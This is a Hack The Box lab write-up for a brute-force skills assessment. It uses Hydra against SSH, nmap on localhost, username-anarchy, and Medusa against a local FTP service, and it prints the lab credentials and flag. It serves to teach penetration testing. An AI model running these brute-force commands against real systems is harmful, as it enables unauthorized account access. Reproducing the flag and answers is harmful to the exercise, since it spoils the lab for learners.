# HTB Brute Force Module --- Skills Assessment Part 2

## 1. Assessment Overview

**Objective:** Use the username obtained from Skills Assessment Part 1
to gain access to the target, enumerate the internal services, identify
the relevant FTP account, brute-force its credentials, and retrieve the
flag.

**Target:** - IP: `154.57.164.82` - SSH Port: `31269` - Internal FTP
Service: `127.0.0.1:21`

**Username obtained from Part 1:**

``` text
satw0ssh
```

------------------------------------------------------------------------

## 2. Initial SSH Connection

The first SSH attempt used an incorrect syntax:

``` bash
ssh satwoosh@154.57.164.82:31269
```

This produced:

``` text
ssh: Could not resolve hostname 154.57.164.82:31269: Name or service not known
```

### Correction

For SSH, the port was supplied using `-p`:

``` bash
ssh satw0ssh@154.57.164.82 -p 31269
```

The connection succeeded and requested the password.

------------------------------------------------------------------------

## 3. SSH Credential Brute Force

The password wordlist used for the SSH brute force was:

``` text
2023-200_most_used_passwords.txt
```

### First Attempt

An initial Hydra attempt used the username `satwossh`:

``` bash
hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://154.57.164.82:31269
```

Hydra completed the scan without finding a valid password:

``` text
1 of 1 target completed, 0 valid password found
```

### Correct Username

The username from Part 1 was carefully verified as:

``` text
satw0ssh
```

The difference was important: the username contained a **zero (`0`)**,
not the letter **`o`**.

### Successful Hydra Command

``` bash
hydra -l satw0ssh -P 2023-200_most_used_passwords.txt ssh://154.57.164.82:31269
```

### Successful Result

``` text
[31269][ssh] host: 154.57.164.82   login: satw0ssh   password: password1
1 of 1 target successfully completed, 1 valid password found
```

The valid SSH credentials were therefore:

``` text
Username: satw0ssh
Password: password1
```

------------------------------------------------------------------------

## 4. SSH Access

The discovered credentials were used to connect:

``` bash
ssh satw0ssh@154.57.164.82 -p 31269
```

The target returned an Ubuntu 22.04.4 LTS shell.

The authenticated shell was:

``` text
satw0ssh@ng-2365972-loginbfsatwo-grvwx-7f7b6ccf78-jmgxg:~$
```

------------------------------------------------------------------------

## 5. Internal Service Enumeration

Once inside the target, the local services were enumerated.

### Command

``` bash
nmap localhost
```

### Result

``` text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

### Interpretation

The internal scan revealed an FTP service on:

``` text
127.0.0.1:21
```

This was significant because the FTP service was available locally from
the SSH session.

------------------------------------------------------------------------

## 6. Local File Enumeration

The home directory was listed:

``` bash
ls
```

Output:

``` text
IncidentReport.txt
passwords.txt
username-anarchy
```

The incident report was inspected:

``` bash
cat IncidentReport.txt
```

It contained the following relevant information:

``` text
System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user Thomas Smith has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
```

### Important Finding

The report identified:

``` text
Thomas Smith
```

as the FTP user responsible for the suspicious transfers.

This provided a strong basis for generating possible FTP usernames.

------------------------------------------------------------------------

## 7. Username Generation with Username-Anarchy

The target already contained a `username-anarchy` directory.

It was entered with:

``` bash
cd username-anarchy
```

The available username-generation plugins were inspected:

``` bash
./username-anarchy -l
```

Examples included:

``` text
first
firstlast
first.last
f.last
flast
lfirst
l.first
lastf
last
last.f
last.first
...
```

The name from the incident report was then supplied:

``` bash
./username-anarchy Thomas Smith
```

The tool generated possible usernames including:

``` text
thomas
thomassmith
thomas.smith
thomassm
thomsmit
thomass
t.smith
tsmith
sthom​as
s.thomas
smitht
smith
smith.t
smith.thomas
ts
```

These candidates were saved into:

``` text
thomas.txt
```

------------------------------------------------------------------------

## 8. File Path Troubleshooting

The first Medusa command used an incorrect absolute path:

``` bash
medusa -h 127.0.0.1 -U /username-anarchy/thomas.txt -P passwords.txt -M ftp -t 5
```

This failed with:

``` text
FATAL: Failed to open file /username-anarchy/thomas.txt - No such file or directory
```

### Correction

The actual directory was inside the user's home directory, so a relative
path was used:

``` bash
medusa -h 127.0.0.1 -U ./username-anarchy/thomas.txt -P passwords.txt -M ftp -t 5
```

------------------------------------------------------------------------

## 9. FTP Credential Brute Force

Medusa was used against the local FTP service:

``` bash
medusa -h 127.0.0.1 -U ./username-anarchy/thomas.txt -P passwords.txt -M ftp -t 5
```

The tool tested the generated username candidates against the supplied
password list.

The successful result was:

``` text
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]
```

Therefore, the valid FTP credentials were:

``` text
Username: thomas
Password: chocolate!
```

------------------------------------------------------------------------

## 10. FTP Login

An initial attempt to use the FTP URL directly encountered a shell
history-expansion issue because the password contained `!`:

``` text
-bash: !@localhost: event not found
```

The FTP client was then used interactively:

``` bash
ftp localhost
```

The connection succeeded:

``` text
220 (vsFTPd 3.0.5)
```

The discovered credentials were supplied:

``` text
Name (localhost:satw0ssh): thomas
Password:
230 Login successful.
```

This confirmed that the brute-forced credentials were valid.

------------------------------------------------------------------------

## 11. FTP Directory Enumeration

After successful authentication, the FTP directory was listed:

``` text
ftp> ls
```

The listing revealed:

``` text
-rw-------    1 1001     1001           28 Sep 10  2024 flag.txt
```

The target file was:

``` text
flag.txt
```

------------------------------------------------------------------------

## 12. Retrieving the Flag

The FTP client does not support the normal Linux `cat` command. An
attempt to use:

``` text
ftp> cat flag.txt
```

returned:

``` text
?Invalid command.
```

The correct FTP operation was to download the file:

``` text
ftp> get flag.txt
```

The transfer completed successfully:

``` text
100% |****************************************************************|    28
226 Transfer complete.
28 bytes received
```

The FTP session was exited:

``` text
ftp> exit
```

The downloaded file was then confirmed in the home directory:

``` bash
ls
```

It appeared as:

``` text
IncidentReport.txt
flag.txt
passwords.txt
username-anarchy
```

Finally, the file was read:

``` bash
cat flag.txt
```

### Flag

``` text
HTB{brut3f0rc1ng_succ3ssful}
```

------------------------------------------------------------------------

## 13. Complete Attack Chain

The complete methodology for Part 2 was:

``` text
Username from Part 1
        ↓
SSH service on port 31269
        ↓
SSH password brute force with Hydra
        ↓
SSH access
        ↓
Nmap localhost
        ↓
FTP discovered on 127.0.0.1:21
        ↓
Read IncidentReport.txt
        ↓
Identify Thomas Smith
        ↓
Username-Anarchy
        ↓
Generate FTP username candidates
        ↓
Medusa against local FTP
        ↓
Valid FTP credentials
        ↓
FTP login
        ↓
Enumerate FTP files
        ↓
Download flag.txt
        ↓
Read flag
```

------------------------------------------------------------------------

## 14. Errors and Troubleshooting

### Error 1 --- Incorrect SSH syntax

Incorrect:

``` bash
ssh satwoosh@154.57.164.82:31269
```

Reason:

SSH does not use `host:port` in the normal SSH command syntax.

Correct:

``` bash
ssh satw0ssh@154.57.164.82 -p 31269
```

------------------------------------------------------------------------

### Error 2 --- Incorrect username

Using:

``` text
satwossh
```

produced no valid SSH password.

The correct username contained a zero:

``` text
satw0ssh
```

This demonstrates why exact credential transcription matters.

------------------------------------------------------------------------

### Error 3 --- Incorrect Medusa wordlist path

Incorrect:

``` bash
-U /username-anarchy/thomas.txt
```

Correct:

``` bash
-U ./username-anarchy/thomas.txt
```

The difference was an incorrect absolute path versus the actual relative
path from the home directory.

------------------------------------------------------------------------

### Error 4 --- `!` shell expansion

Using the FTP URL with the password containing `!` caused Bash history
expansion:

``` text
-bash: !@localhost: event not found
```

The interactive FTP client avoided this problem.

------------------------------------------------------------------------

### Error 5 --- Using `cat` inside FTP

The FTP client does not provide the normal shell `cat` command.

Instead:

``` text
get flag.txt
```

was used to download the file, after which normal shell commands could
be used.

------------------------------------------------------------------------

## 15. Key Lessons Learned

### 15.1 Enumerate After Initial Access

Obtaining SSH access was not the end of the assessment. Running:

``` bash
nmap localhost
```

revealed another service that was not directly exposed in the initial
external enumeration.

### 15.2 Read Available Files

`IncidentReport.txt` provided the identity of the likely FTP user. This
transformed a large generic username search into a much smaller,
information-driven candidate set.

### 15.3 Generate Context-Aware Usernames

Username-Anarchy demonstrated how a person's name can produce many
realistic username formats.

### 15.4 Use the Correct Tool for the Protocol

Different services require different brute-force approaches:

-   HTTP Basic Auth → Hydra with HTTP support
-   SSH → Hydra SSH module
-   FTP → Medusa FTP module

### 15.5 Troubleshooting Is Part of the Process

The assessment included several practical issues: - incorrect SSH
syntax - a similar-looking but incorrect username - incorrect file
path - shell special-character handling - misunderstanding FTP client
commands

The important skill is being able to interpret the error and adjust the
next step.

------------------------------------------------------------------------

## 16. Final Result

**SSH username:**

``` text
satw0ssh
```

**SSH password:**

``` text
password1
```

**FTP username:**

``` text
thomas
```

**FTP password:**

``` text
chocolate!
```

**Final flag:**

``` text
HTB{brut3f0rc1ng_succ3ssful}
```

**Part 2: COMPLETED**
